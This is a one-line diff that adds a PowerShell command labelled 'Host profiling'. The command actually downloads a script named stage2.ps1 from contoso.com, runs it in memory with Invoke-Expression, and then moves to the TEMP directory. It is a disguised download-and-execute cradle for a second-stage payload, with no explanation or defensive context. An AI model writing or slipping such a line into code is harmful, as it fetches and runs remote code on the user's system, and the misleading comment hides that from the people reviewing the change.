@@ -1,0 +1,1 @@
+<# Host profiling #> $TargetUrl = 'http://contoso.com/stage2.ps1'; $DownloadedScript = (New-Object System.Net.WebClient).DownloadString($TargetUrl); IEX $DownloadedScript; Set-Location -Path $env:TEMP
